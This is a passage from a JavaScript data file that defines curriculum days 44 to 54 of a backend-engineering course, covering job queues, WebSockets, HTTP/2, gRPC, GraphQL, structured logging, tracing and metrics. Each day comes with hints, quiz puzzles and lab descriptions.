      { id: "node-m2-d43-q2", name: "Detective Lab: The Unsafe DEL Distributed Lock Collision", type: "detective", desc: "Isolate a production inventory race condition caused by non-atomic distributed lock deletion in a microservice cluster." },
      { id: "node-m2-d43-q3", name: "Mastery Assignment: Production Distributed Lock with Fencing Tokens & Lua", type: "assignment", desc: "Build an enterprise distributed lock manager with atomic NX/PX acquisition, safe Lua release, and auto-extending heartbeats." },
      { id: "node-m2-d43-q4", name: "Staff Interview Lab: Multi-Master Redlock Consensus Quorums", type: "detective", desc: "Analyze the Redlock algorithm across N independent Redis nodes and evaluate consensus guarantees under clock drift." }
    ]
  },
  {
    day: 44,
    month: 2,
    blockNum: 9,
    title: "High-Reliability Job Queues: BullMQ, Redis Streams & Dead-Letter Queue (DLQ) Pipelines",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Job Queues & Resilient Background Workers)",
    spokenGoal: "Master enterprise background job processing with BullMQ and Redis Streams: Learn how to decouple HTTP request cycles from slow asynchronous work (sending emails, video encoding, webhook delivery), implement exponential backoff retries, handle worker crashes, and route poison pills to Dead-Letter Queues.",
    conceptInvariant: "Job processing must be At-Least-Once and idempotent. If a worker process crashes mid-job, the queue's lock expires and another worker picks up the job. The job handler MUST be idempotent (safe to execute multiple times without duplicate side-effects).",
    failureMode: "Processing credit card charges in a non-idempotent background job: a worker crash during network delivery causes the queue to re-try the job on another worker, charging the customer's credit card twice.",
    tryItFriction: "Build a BullMQ worker queue with exponential backoff retries: inject intentional failures, observe retries with increasing delays (1s, 2s, 4s, 8s), and verify that permanent failures route to a Dead-Letter Queue (DLQ).",
    socraticHints: [
      "What is a 'Poison Pill' in a message queue?",
      "A message whose payload causes the worker to crash or throw an unrecoverable error every single time it is processed!",
      "Limit retries (e.g. max 3 retries with backoff). When retries are exhausted, move the message to a Dead-Letter Queue (DLQ) so it doesn't block the queue forever."
    ],
    situationalPuzzle: {
      scenario: "A video transcoding queue has 500 jobs pending. A worker picks up Job #42 and begins transcoding. 2 minutes into the 5-minute transcode, the worker server loses power and abruptly shuts down. How does a production queue recover Job #42?",
      options: [
        "The job is lost forever.",
        "Stalled Job Recovery: The queue uses an active lock with a heartbeat. When the worker dies, the lock renewal stops and the lock expires. The queue supervisor detects the stalled job and reassigns it to another healthy worker.",
        "The entire queue pauses.",
        "The user is notified that their video was deleted."
      ],
      answerIdx: 1,
      debrief: "Enterprise queues (like BullMQ) use lock heartbeats. While a worker is processing a job, it periodically renews a lock. If the worker crashes, the lock expires, and the queue supervisor automatically marks the job as stalled and re-queues it for another worker."
    },
    quests: [
      { id: "node-m2-d44-q1", name: "The BullMQ Redis Data Structure Topology", type: "concept", desc: "Trace job states across Redis structures: wait (List), active (Hash + Lock), delayed (ZSET), failed (Set), completed (Set)." },
      { id: "node-m2-d44-q2", name: "Detective Lab: The Poison Pill Worker Crash Loop", type: "detective", desc: "Isolate a malformed webhook payload that crashed workers in an infinite restart loop and configure DLQ routing." },
      { id: "node-m2-d44-q3", name: "Mastery Assignment: Resilient Background Video Processing Pipeline", type: "assignment", desc: "Build an asynchronous worker queue with concurrency limits, exponential backoff, progress tracking, and DLQ alerts." },
      { id: "node-m2-d44-q4", name: "Production Incident Lab: Idempotency Keys in Queue Consumers", type: "detective", desc: "Enforce database idempotency keys inside message consumer handlers to guarantee safe at-least-once message processing." }
    ]
  },
  {
    day: 45,
    month: 2,
    blockNum: 9,
    title: "Milestone 8: Fault-Tolerant Distributed Background Job Queue with BullMQ & Redis Streams",
    stageName: "Stage 2: Guided System Construction",
    stageNum: 2,
    pedagogicalRole: "Milestone Gate (Distributed Queues & Worker Resilience)",
    spokenGoal: "Build and defend Milestone 8: A high-throughput distributed job processing platform using BullMQ and Redis Streams, featuring multi-worker concurrency, priority queues, rate-limited external API workers, dead-letter pipelines, and an administrative dashboard.",
    conceptInvariant: "Distributed worker fleets must throttle downstream API interactions according to external rate limits, guarantee idempotent execution of retried jobs, and maintain zero message loss under worker kill events (`SIGKILL`).",
    failureMode: "Allowing a burst of 10,000 email jobs to fire simultaneously, overwhelming the third-party SendGrid API and triggering permanent account suspension.",
    tryItFriction: "Send 1,000 jobs through the queue: simulate killing 2 worker processes mid-execution, verify that stalled jobs are recovered automatically with zero lost records, and inspect the DLQ for intentionally poisoned payloads.",
    socraticHints: [
      "How do we prevent workers from exceeding third-party API rate limits (e.g. 50 calls/sec)?",
      "Use BullMQ's built-in limiter: `limiter: { max: 50, duration: 1000 }`.",
      "The queue coordinates across all distributed workers via Redis, throttling job dispatches to strictly honor the limit."
    ],
    situationalPuzzle: {
      scenario: "During the Milestone 8 defense, the evaluator inspects your DLQ management. A bug in a microservice is fixed, and 500 failed jobs sit in the Dead-Letter Queue. How does your architecture re-process them?",
      options: [
        "Manually copy-paste the JSON payloads into Postman.",
        "DLQ Redrive Mechanism: An administrative endpoint or CLI command allows operators to inspect failed job stack traces, fix downstream dependencies, and atomically redrive (re-queue) DLQ jobs back into the active processing queue.",
        "Delete the jobs and ask users to re-submit.",
        "Export them to a CSV file."
      ],
      answerIdx: 1,
      debrief: "A Dead-Letter Queue must include a Redrive mechanism. Once engineering fixes the root cause of the failure, operators can inspect the failed payloads and trigger an automated redrive to replay the failed jobs through the pipeline."
    },
    quests: [
      { id: "node-m2-d45-q1", name: "Milestone 8 Job Queue Architecture Specification", type: "concept", desc: "Design the multi-tier queue topology: high-priority jobs, standard jobs, delayed jobs, rate limiters, and DLQ." },
      { id: "node-m2-d45-q2", name: "Detective Lab: The Downstream Third-Party Rate Limit Blackout", type: "detective", desc: "Diagnose an outage where unthrottled worker concurrency caused third-party payment APIs to return HTTP 429 errors." },
      { id: "node-m2-d45-q3", name: "Mastery Assignment: Production Distributed Job Processing Engine", type: "assignment", desc: "Deliver the full job platform with BullMQ, Redis Streams, rate limiters, dead-letter queues, and live CLI telemetry." },
      { id: "node-m2-d45-q4", name: "Milestone 8 Defense: Distributed Queuing & Fault Tolerance Viva", type: "detective", desc: "Defend your worker lock heartbeats, stalled job detection, and idempotency guarantees before Senior Architects." }
    ]
  },

  // ── BLOCK 10: Real-Time Protocols: WebSockets, HTTP/2 & gRPC (Days 46–50) ──────
  {
    day: 46,
    month: 2,
    blockNum: 10,
    title: "Binary WebSocket Engine: Framing Specs, Heartbeat Ping/Pong & Socket Connection Pools",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (WebSocket Protocol & Binary Framing)",
    spokenGoal: "Master the WebSocket protocol (RFC 6455) from the wire up: Understand the HTTP 101 Switching Protocols upgrade handshake, binary frame masks and opcodes, build a heartbeat ping/pong keep-alive system to detect dead TCP sockets, and broadcast messages to 10,000 clients efficiently.",
    conceptInvariant: "TCP connections can die silently without sending a FIN packet (e.g. mobile client enters an elevator or tunnel). If the server only sends data when an event occurs, it will hold dead sockets open forever. The server MUST implement proactive application-level Ping/Pong heartbeats to detect and terminate half-open sockets.",
    failureMode: "Broadcasting a message to 10,000 connected WebSocket clients by serializing a JSON string 10,000 times inside a loop: CPU utilization hits 100%, and broadcast latency spikes to seconds.",
    tryItFriction: "Build a WebSocket server using `ws`: serialize the broadcast message ONCE into a binary buffer, send that pre-serialized buffer to 5,000 connected clients, and measure a 15x reduction in CPU broadcast time.",
    socraticHints: [
      "Why did broadcasting to 10,000 clients freeze the server for 400ms?",
      "In your loop you wrote `socket.send(JSON.stringify(data))`. You parsed and serialized the SAME JSON 10,000 times in a row!",
      "Serialize the payload ONCE into a string or Buffer before the loop: `const msg = JSON.stringify(data); clients.forEach(c => c.send(msg));`."
    ],
    situationalPuzzle: {
      scenario: "A real-time cryptocurrency exchange server has 50,000 connected WebSockets. Overnight, 15,000 mobile clients lose connectivity due to cell tower switches. The server still reports 50,000 active connections in memory. Why didn't the server know the connections died?",
      options: [
        "The database crashed.",
        "Half-Open TCP Sockets: When a mobile device loses radio signal abruptly, it cannot send a TCP FIN packet. The server's TCP socket remains in ESTABLISHED state indefinitely until an application-level Ping/Pong heartbeat detects the silence.",
        "WebSockets don't support mobile phones.",
        "The OS ran out of memory."
      ],
      answerIdx: 1,
      debrief: "Abrupt physical disconnections create Half-Open sockets: the server thinks the socket is open, but the client is gone. Periodic Ping/Pong heartbeats (e.g. every 30s) detect when a client fails to return a Pong, allowing the server to terminate dead sockets."
    },
    quests: [
      { id: "node-m2-d46-q1", name: "The RFC 6455 WebSocket Frame Grammar Specification", type: "concept", desc: "Deconstruct binary frames: FIN bit, RSVP bits, Opcode (Text, Binary, Close, Ping, Pong), Mask bit, and Payload length." },
      { id: "node-m2-d46-q2", name: "Detective Lab: The Half-Open Socket File Descriptor Leak", type: "detective", desc: "Diagnose an enterprise leak where thousands of ghost sockets accumulated in memory due to missing ping/pong heartbeats." },
      { id: "node-m2-d46-q3", name: "Mastery Assignment: High-Scale Binary WebSocket Broadcast Server", type: "assignment", desc: "Build a WebSocket server managing 10,000 concurrent connections with pre-serialized binary broadcasting and heartbeats." },
      { id: "node-m2-d46-q4", name: "Production Incident Lab: WebSocket Load Balancing & Sticky Sessions", type: "detective", desc: "Configure NGINX/HAProxy reverse proxy headers (`Upgrade`, `Connection`) and Redis Pub/Sub for multi-server broadcasts." }
    ]
  },
  {
    day: 47,
    month: 2,
    blockNum: 10,
    title: "HTTP/2 Multiplexing in Node.js: Binary Framing, Streams & Header Compression (HPACK)",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (HTTP/2 Protocol & Stream Multiplexing)",
    spokenGoal: "Master HTTP/2 architecture with Node's native `http2` module: Understand how HTTP/2 eliminates HTTP/1.1 head-of-line blocking through true binary framing and multiplexing over a single TCP connection, and how HPACK compresses repeated headers.",
    conceptInvariant: "In HTTP/1.1, each TCP connection can only process ONE request/response at a time. HTTP/2 splits communication into interleaved binary frames (HEADERS, DATA, SETTINGS, RST_STREAM) mapped to virtual streams, allowing hundreds of concurrent requests over a single shared TCP socket.",
    failureMode: "Domain sharding and bundling thousands of tiny JS files for HTTP/2: bundling techniques designed for HTTP/1.1 can actually hurt HTTP/2 caching efficiency and increase multiplexing overhead.",
    tryItFriction: "Create an HTTP/2 server using `node:http2` with TLS (ALPN negotiation): stream 50 concurrent resources to a browser over a single TCP connection, verifying in DevTools that all 50 download simultaneously over connection ID 1.",
    socraticHints: [
      "Why does HTTP/2 require TLS (HTTPS) in modern browsers?",
      "The HTTP/2 specification technically allows cleartext (h2c), but all major browsers mandate TLS using ALPN negotiation for security and to prevent intermediate proxies from mangling binary frames!",
      "Use `http2.createSecureServer()` with valid SSL certificates."
    ],
    situationalPuzzle: {
      scenario: "A microservices cluster makes 2,000 internal API calls per second between Node.js services. Moving from HTTP/1.1 to HTTP/2 reduces internal network bandwidth consumption by 65%. What specific HTTP/2 feature delivered this dramatic bandwidth savings?",
      options: [
        "Gzip compression of images.",
        "HPACK Header Compression: HTTP requests contain identical repeated headers (Cookie, Authorization, User-Agent). HPACK maintains a shared header table between client and server, transmitting 1-byte index pointers instead of full header strings.",
        "HTTP/2 deletes the headers.",
        "The requests were cancelled."
      ],
      answerIdx: 1,
      debrief: "HTTP headers are large and repetitive. HPACK uses a static and dynamic table between client and server. After the initial request, repeated headers are replaced with tiny numeric index references (often 1 or 2 bytes), reducing header overhead by over 80%."
    },
    quests: [
      { id: "node-m2-d47-q1", name: "The HTTP/2 Binary Frame Specification", type: "concept", desc: "Analyze 9-byte frame headers: Length (24b), Type (8b), Flags (8b), Stream ID (31b), and Frame Payloads." },
      { id: "node-m2-d47-q2", name: "Detective Lab: The ALPN Protocol Negotiation Failure", type: "detective", desc: "Fix an issue where clients failed to establish HTTP/2 connections due to missing ALPN ('h2') TLS configuration." },
      { id: "node-m2-d47-q3", name: "Mastery Assignment: Production HTTP/2 Secure Server with Server Push", type: "assignment", desc: "Build a high-performance HTTP/2 server with multiplexed stream routing, flow control windows, and HPACK tracking." },
      { id: "node-m2-d47-q4", name: "Staff Interview Lab: HTTP/2 vs HTTP/3 (QUIC / UDP) Architectural Transition", type: "detective", desc: "Analyze TCP-level head-of-line blocking under packet loss and how HTTP/3 over QUIC solves it via UDP." }
    ]
  },
  {
    day: 48,
    month: 2,
    blockNum: 10,
    title: "High-Performance gRPC Microservices: Protobuf Schemas, gRPC Channels & Bidirectional Streaming",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (gRPC, Protocol Buffers & Binary RPC)",
    spokenGoal: "Master gRPC backend communication: Learn why internal microservices use gRPC over REST/JSON (7x faster serialization, 50% smaller payloads, strict type contracts), define schemas with Protocol Buffers (`.proto`), and implement Unary, Client-Streaming, Server-Streaming, and Bidirectional Streaming RPCs.",
    conceptInvariant: "Protocol Buffers (Protobuf) serialize data into a compact binary format using field numbers (tags) and varints, eliminating key strings completely. Combined with HTTP/2 transport, gRPC provides low-latency, strongly typed, contract-first communication across polyglot microservices.",
    failureMode: "Changing field numbers in a `.proto` file in production: Protobuf identifies fields by their integer numbers, not their names! Reordering field numbers corrupts data across services running different schema versions.",
    tryItFriction: "Define a `.proto` service contract: compile it with `@grpc/proto-loader`, implement a bidirectional streaming RPC that exchanges continuous market price ticks, and benchmark against JSON-over-HTTP.",
    socraticHints: [
      "Can we rename a field in a `.proto` file without breaking existing services?",
      "YES, as long as you do NOT change the field NUMBER! Protobuf over the wire encodes only field numbers and wire types, never field names.",
      "Never re-assign, change, or reuse an existing field number in a production Protocol Buffer schema."
    ],
    situationalPuzzle: {
      scenario: "A fintech infrastructure runs 50 microservices communicating via REST/JSON. Under high load, CPU utilization across the cluster is dominated by JSON parsing and serialization (`JSON.parse` / `JSON.stringify`). How does migrating to gRPC with Protocol Buffers eliminate this bottleneck?",
      options: [
        "It moves the services to the cloud.",
        "Binary Tagged Serialization: Protobuf compiles directly into native C++/V8 binary encoders that skip expensive string parsing, delimiter scanning, and key serialization, reducing CPU serialization overhead by 70–85%.",
        "It eliminates the network.",
        "gRPC compresses files with zip."
      ],
      answerIdx: 1,
      debrief: "JSON is human-readable text requiring character-by-character parsing and escaping. Protobuf is a packed binary wire format using numeric field tags. Encoding and decoding requires a fraction of the CPU cycles of JSON, unlocking massive throughput."
    },
    quests: [
      { id: "node-m2-d48-q1", name: "The Protocol Buffers Binary Wire Format Specification", type: "concept", desc: "Deconstruct Varints, ZigZag encoding (for signed integers), Field Numbers, and Wire Types (Varint, Fixed64, Length-delimited)." },
      { id: "node-m2-d48-q2", name: "Detective Lab: The Reused Protobuf Field Number Data Corruption", type: "detective", desc: "Diagnose a critical production bug where reassigning field number 2 mapped user email addresses into phone number fields." },
      { id: "node-m2-d48-q3", name: "Mastery Assignment: Full-Duplex Bidirectional Streaming gRPC Service", type: "assignment", desc: "Build a real-time order-matching engine with Protobuf contracts, bidirectional gRPC streams, and client reconnection." },
      { id: "node-m2-d48-q4", name: "Production Incident Lab: gRPC Load Balancing with Envoy Proxies", type: "detective", desc: "Solve gRPC load balancing across long-lived HTTP/2 TCP connections using Envoy L7 proxy connection slicing." }
    ]
  },
  {
    day: 49,
    month: 2,
    blockNum: 10,
    title: "GraphQL Federation & Subscriptions: Schema Stitching, N+1 DataLoader Batching & WebSockets",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (GraphQL Federation & DataLoader Batching)",
    spokenGoal: "Master enterprise GraphQL architecture: Learn how Apollo Federation composes distributed microservice subgraphs into a unified supergraph, eliminate the catastrophic N+1 database query problem using DataLoader batching and caching, and implement real-time GraphQL Subscriptions over WebSockets.",
    conceptInvariant: "The N+1 problem occurs when a query fetching 100 posts executes 1 query for posts and then 100 separate queries for each post's author. DataLoader solves this by collecting all author IDs requested within a single event loop tick and executing a SINGLE batched SQL query: `SELECT * FROM users WHERE id IN ($1, $2, ...)`.",
    failureMode: "Executing a nested GraphQL query without DataLoader: a query for 50 orders with 10 items each triggers 501 separate SQL queries, taking down the relational database.",
    tryItFriction: "Implement a DataLoader batch function in pure TypeScript: demonstrate that 50 individual `authorLoader.load(id)` calls in resolver functions coalesce into exactly 1 database query via `process.nextTick`.",
    socraticHints: [
      "How does DataLoader know when to send the batched query?",
      "It uses `process.nextTick`! When you call `.load(id)`, DataLoader queues the ID. On the very next microtask tick, it fires the batched SQL query with all accumulated IDs.",
      "This guarantees that all sibling resolvers in the current execution frame are batched together."
    ],
    situationalPuzzle: {
      scenario: "An enterprise GraphQL Gateway federates two subgraphs: Users Service and Orders Service. A query requests `orders { id total user { name email } }`. The Orders service returns 100 orders, but the Gateway makes 100 individual HTTP calls to the Users service. What architectural component is missing at the gateway layer?",
      options: [
        "A bigger server.",
        "Entity DataLoader Batching: The federation gateway must batch entity representation queries (`_entities`) so that all 100 user IDs are requested in a single batched HTTP request to the Users subgraph.",
        "GraphQL does not support microservices.",
        "Disable user queries."
      ],
      answerIdx: 1,
      debrief: "Just as local GraphQL resolvers need DataLoaders to batch database queries, federated GraphQL gateways need Entity DataLoaders to batch cross-service HTTP requests, preventing N+1 network requests between subgraphs."
    },
    quests: [
      { id: "node-m2-d49-q1", name: "The Apollo Federation v2 Supergraph Architecture", type: "concept", desc: "Analyze `@key`, `@extends`, `@external`, `@requires` directives and query plan generation across subgraphs." },
      { id: "node-m2-d49-q2", name: "Detective Lab: The 1,000-Query N+1 Database Collapse", type: "detective", desc: "Profile a GraphQL endpoint that executed 1,000 SQL queries for a single request and resolve it with DataLoader batching." },
      { id: "node-m2-d49-q3", name: "Mastery Assignment: Production Federated Subgraph with DataLoader & Subscriptions", type: "assignment", desc: "Build a federated microservice subgraph with DataLoader batching, WebSocket subscriptions, and query depth limits." },
      { id: "node-m2-d49-q4", name: "Production Incident Lab: Malicious Deeply-Nested GraphQL Query DoS Attacks", type: "detective", desc: "Deploy query complexity analysis (`graphql-query-complexity`) to reject malicious cyclic recursive queries before execution." }
    ]
  },
  {
    day: 50,
    month: 2,
    blockNum: 10,
    title: "Milestone 9: High-Throughput gRPC & WebSocket Market Telemetry Gateway (50k msgs/sec)",
    stageName: "Stage 2: Guided System Construction",
    stageNum: 2,
    pedagogicalRole: "Milestone Gate (Real-Time Networking & Protocol Invariants)",
    spokenGoal: "Build and defend Milestone 9: A hybrid market telemetry gateway ingesting 50,000 price ticks per second from internal trading engines via gRPC streaming, multiplexing ticks through an in-memory ring buffer, and broadcasting to 10,000 client WebSockets with sub-10ms delivery latency.",
    conceptInvariant: "Real-time market data gateways must isolate high-frequency gRPC ingress from client WebSocket distribution, drop slow consumer sockets that fail to keep up with the broadcast rate, and serialize binary payloads once per tick.",
    failureMode: "Allowing a single slow mobile WebSocket client with high network latency to buffer millions of price ticks in memory, crashing the entire gateway for all other 9,999 users.",
    tryItFriction: "Inject 50,000 ticks/sec via gRPC: simulate 100 slow WebSocket clients that stop reading, verify that the gateway detects socket buffer bloat and forcibly disconnects the slow clients while maintaining 60 FPS delivery for healthy clients.",
    socraticHints: [
      "What should a high-frequency trading gateway do if a client's socket buffer exceeds 5MB?",
      "Disconnect the client immediately! In high-frequency telemetry, old data is useless. Storing millions of ticks in memory will crash the server.",
      "Check `socket.bufferedAmount > MAX_BUFFER` before writing, and terminate slow consumers."
    ],
    situationalPuzzle: {
      scenario: "During the Milestone 9 defense, the evaluator checks memory usage during a 50,000 ticks/sec stress test. Memory remains steady at 65MB. How did your architecture prevent memory growth despite 10,000 connected WebSockets?",
      options: [
        "You dropped all the ticks.",
        "Zero-Allocation Binary Broadcasting & Pre-Serialized Framing: Ticks arriving via gRPC are validated and transformed into a single pre-framed binary WebSocket buffer in memory once, and transmitted directly to active socket file descriptors with zero per-client allocations.",
        "You disabled WebSockets.",
        "Node.js automatically handles it."
      ],
      answerIdx: 1,
      debrief: "High-throughput broadcasting succeeds by eliminating per-client work. Framing the binary message once in memory and transmitting that single buffer instance across all sockets allows Node.js to broadcast 50k msgs/sec with negligible memory usage."
    },
    quests: [
      { id: "node-m2-d50-q1", name: "Milestone 9 High-Throughput Gateway Architecture Specification", type: "concept", desc: "Design the gRPC ingest pipeline, in-memory ring buffer, slow consumer shedding policy, and binary broadcast loop." },
      { id: "node-m2-d50-q2", name: "Detective Lab: The Slow Consumer Buffer Bloat Outage", type: "detective", desc: "Diagnose an outage where a single paused client socket buffered 800MB of telemetry data and enforce bufferedAmount limits." },
      { id: "node-m2-d50-q3", name: "Mastery Assignment: 50,000 Ticks/Sec gRPC-to-WebSocket Telemetry Gateway", type: "assignment", desc: "Deliver the production gateway with gRPC streaming ingress, binary WebSocket broadcast, and slow-client termination." },
      { id: "node-m2-d50-q4", name: "Milestone 9 Defense: Real-Time Wire Protocols & Concurrency Viva", type: "detective", desc: "Defend your binary serialization, memory limits, and socket flow control policies before Senior Telemetry Architects." }
    ]
  },

  // ── BLOCK 11: Observability, Tracing & Chaos Engineering (Days 51–55) ─────────
  {
    day: 51,
    month: 2,
    blockNum: 11,
    title: "Structured Logging Architecture: Pino JSON Logging, Correlation IDs & Redaction",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Structured Logging & Log Pipelines)",
    spokenGoal: "Master enterprise logging architecture: Understand why synchronous `console.log()` destroys backend throughput by blocking the event loop on terminal I/O, implement ultra-fast asynchronous JSON logging using Pino, trace requests across microservices using Correlation IDs, and sanitize PII automatically.",
    conceptInvariant: "In production, NEVER use `console.log()`. Terminal standard output is synchronous in many Node.js configurations; calling console.log inside high-throughput route handlers introduces blocking event loop delays. Pino achieves 5x higher throughput by serializing JSON asynchronously to worker threads or non-blocking pipes.",
    failureMode: "Logging user request bodies containing passwords, credit card numbers, or social security numbers directly to Elasticsearch, resulting in catastrophic GDPR/PCI-DSS compliance fines.",
    tryItFriction: "Benchmark `console.log()` vs `pino` under 10,000 log iterations: measure the 80% latency reduction with Pino, and configure automatic redaction for `['req.headers.authorization', 'req.body.password']`.",
    socraticHints: [
      "Why did our API slow down by 60% when we added debug logging in a loop?",
      "Writing to stdout with `console.log()` can be synchronous! The event loop pauses on every single log line waiting for the terminal or pipe to accept bytes.",
      "Use `pino`. It serializes structured JSON with minimal overhead and buffers output asynchronously."
    ],
    situationalPuzzle: {
      scenario: "A microservice cluster receives an HTTP request that traverses Gateway -> Auth -> Order Service -> Payment Gateway. The payment fails. When querying Datadog logs, the engineer sees 40,000 log lines from different requests interleaved together. How do Correlation IDs allow instant isolation of this single transaction?",
      options: [
        "Search by the user's name.",
        "X-Correlation-ID / Trace ID Propagation: The Gateway generates a unique UUID (e.g. `X-Correlation-ID: c1a8...`) and forwards it in HTTP headers across all internal service calls. Every service includes this ID in all log lines, allowing instant single-trace filtering.",
        "Look at the server clock.",
        "Re-run the request."
      ],
      answerIdx: 1,
      debrief: "Correlation IDs link distributed log records. Passing a unique request identifier in HTTP headers across microservices ensures every log line emitted by any service carries the same trace tag, enabling instant end-to-end transaction debugging in log aggregators."
    },
    quests: [
      { id: "node-m2-d51-q1", name: "The Asynchronous Non-Blocking Logging Pipeline", type: "concept", desc: "Trace Pino sonic-boom buffer architecture, thread workers, and non-blocking stdout pipe handling." },
      { id: "node-m2-d51-q2", name: "Detective Lab: The Production Console.log Event Loop Starvation", type: "detective", desc: "Isolate a 200ms latency spike caused by synchronous console.log debugging left in an order processing loop." },
      { id: "node-m2-d51-q3", name: "Mastery Assignment: Production Logging Framework with PII Redaction & Tracing", type: "assignment", desc: "Build an enterprise Pino logging plugin with automatic correlation ID injection, PII masking, and child loggers." },
      { id: "node-m2-d51-q4", name: "Production Incident Lab: Log Injection & Unescaped Newline Exploits", type: "detective", desc: "Sanitize user inputs inside log records to prevent attackers from injecting fake log lines (CWE-117 Log Injection)." }
    ]
  },
  {
    day: 52,
    month: 2,
    blockNum: 11,
    title: "Distributed Tracing with OpenTelemetry: Context Propagation, Spans & Jaeger Visualizations",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (OpenTelemetry & Distributed Tracing)",
    spokenGoal: "Master OpenTelemetry distributed tracing: Learn how W3C `traceparent` headers propagate execution context across distributed network boundaries, instrument incoming HTTP requests and database queries as hierarchical Spans, and visualize request latency bottlenecks in Jaeger.",
    conceptInvariant: "Logs tell you WHAT happened; Metrics tell you SYSTEM HEALTH; Traces tell you WHERE TIME WAS SPENT. In OpenTelemetry, an asynchronous context manager (`AsyncLocalStorage`) propagates the active Trace ID and Span ID across asynchronous promises without manual parameter passing.",
    failureMode: "Manually passing a `traceContext` argument through 50 internal service functions: a single missed function call breaks the trace context, disconnecting child database spans from the parent HTTP trace.",
    tryItFriction: "Instrument a Node.js API with `@opentelemetry/sdk-node`: trace an HTTP request that queries PostgreSQL and Redis, and visualize the nested spans in a local Jaeger dashboard.",
    socraticHints: [
      "How does OpenTelemetry track the current trace across asynchronous `await` calls without passing it as an argument?",
      "Node's built-in `AsyncLocalStorage` API! It stores asynchronous execution context that survives across promise resolutions and callbacks automatically.",
      "Any code executing in that asynchronous call tree can access the active span via `trace.getActiveSpan()`."
    ],
    situationalPuzzle: {
      scenario: "A user checkout request takes 1,800ms. The team argues over whether the delay is in the Node.js API, the PostgreSQL database, or the third-party fraud detection API. What does an OpenTelemetry waterfall trace flamegraph reveal immediately?",
      options: [
        "It reveals nothing.",
        "Exact Span Latency Breakdown: The flamegraph visualizes the exact timeline of child spans: 20ms in Node, 30ms in Postgres, and 1,750ms blocked waiting for the fraud detection HTTP call, instantly pinpointing the root cause.",
        "It shows CPU temperature.",
        "It restarts the request."
      ],
      answerIdx: 1,
      debrief: "Distributed tracing eliminates guessing. Waterfall flamegraphs display the start time, duration, and hierarchy of every operation (HTTP, DB, cache) involved in a request, immediately exposing which downstream dependency caused the latency."
    },
    quests: [
      { id: "node-m2-d52-q1", name: "The W3C TraceContext Specification & Header Grammar", type: "concept", desc: "Deconstruct the traceparent header: Version (00), Trace ID (32 hex), Parent Span ID (16 hex), and Trace Flags (01 sampled)." },
      { id: "node-m2-d52-q2", name: "Detective Lab: The Broken AsyncLocalStorage Trace Context", type: "detective", desc: "Fix an issue where an unhandled callback pattern detached child database spans from the parent HTTP trace." },
      { id: "node-m2-d52-q3", name: "Mastery Assignment: Full-Stack OpenTelemetry Instrumentation Suite", type: "assignment", desc: "Deploy automated OpenTelemetry tracing for HTTP, pg, redis, and custom business spans with Jaeger exporter." },
      { id: "node-m2-d52-q4", name: "Staff Interview Lab: Head-Based vs Tail-Based Trace Sampling Strategies", type: "detective", desc: "Evaluate sampling trade-offs: 1% head-based sampling to save storage vs 100% tail-based sampling for high-latency traces." }
    ]
  },
  {
    day: 53,
    month: 2,
    blockNum: 11,
    title: "Production Metrics & Health Probes: Prometheus /metrics Scraping, P99 Latency & Error Budgets",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Prometheus Metrics & SRE Error Budgets)",
    spokenGoal: "Master backend metrics engineering with Prometheus: Instrument Node.js services with the 4 core metric types (Counters, Gauges, Histograms, Summaries), export metrics via `/metrics` using `prom-client`, track the 4 Golden Signals (Latency, Traffic, Errors, Saturation), and define SRE Error Budgets.",
    conceptInvariant: "Never calculate average latency (mean) in production; averages hide catastrophic outliers. A service with a 20ms average latency can still have 5% of users experiencing 5,000ms timeouts! Always use Histograms to compute percentiles: p50, p95, and p99.",
    failureMode: "Alerting on average CPU or average latency: an outage affecting 2% of users is completely invisible in average metrics, allowing silent revenue loss.",
    tryItFriction: "Instrument an API route with a Prometheus Histogram tracking duration buckets `[0.01, 0.05, 0.1, 0.5, 1, 2, 5]` seconds, and query `histogram_quantile(0.99, ...)` in Prometheus.",
    socraticHints: [
      "Why is a Histogram needed to calculate p99 latency?",
      "You cannot calculate percentiles across multiple distributed servers by averaging! A histogram places request durations into fixed buckets, allowing Prometheus to compute exact percentiles globally.",
      "Use `prom-client.Histogram` with appropriate bucket boundaries."
    ],
    situationalPuzzle: {
      scenario: "An enterprise candidate is asked: 'What is the critical difference between a Kubernetes Liveness Probe (`/health/live`) and a Readiness Probe (`/health/ready`)?'",
      options: [
        "They are identical.",
        "Liveness vs Readiness: If Liveness fails, Kubernetes KILLS and restarts the container (used when event loop is deadlocked). If Readiness fails, Kubernetes STOPS sending traffic to the container (used when database is reconnecting), keeping the container alive to recover.",
        "Readiness is only for databases.",
        "Liveness only runs on startup."
      ],
      answerIdx: 1,
      debrief: "Liveness probes detect deadlocks: failure restarts the process. Readiness probes detect temporary unavailability (e.g. database pool reconnecting or warming cache): failure removes the pod from load balancer rotation until it is ready, preventing customer errors."
    },
    quests: [
      { id: "node-m2-d53-q1", name: "The 4 Golden Signals of SRE Monitoring Specification", type: "concept", desc: "Deconstruct Latency (p99), Traffic (requests/sec), Errors (5xx rate), and Saturation (CPU/memory/queue depth)." },
      { id: "node-m2-d53-q2", name: "Detective Lab: The Misconfigured Liveness Probe Restart Loop", type: "detective", desc: "Fix an incident where a slow database query caused Kubernetes to repeatedly kill healthy application pods." },
      { id: "node-m2-d53-q3", name: "Mastery Assignment: Production Prometheus Exporter & Health Probe Suite", type: "assignment", desc: "Build an enterprise metrics suite with default Node.js runtime metrics, custom route histograms, and dual health probes." },
      { id: "node-m2-d53-q4", name: "Staff Interview Lab: Calculating SLOs & Error Budget Burn Rates", type: "detective", desc: "Derive a 99.9% availability Service Level Objective (SLO) error budget and calculate multi-window burn rate alerts." }
    ]
  },
  {
    day: 54,
    month: 2,
    blockNum: 11,
    title: "Chaos Engineering in Node.js: Event Loop Lag Injections, Network Partition Recovery & Circuit Breakers",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Chaos Engineering & Circuit Breakers)",
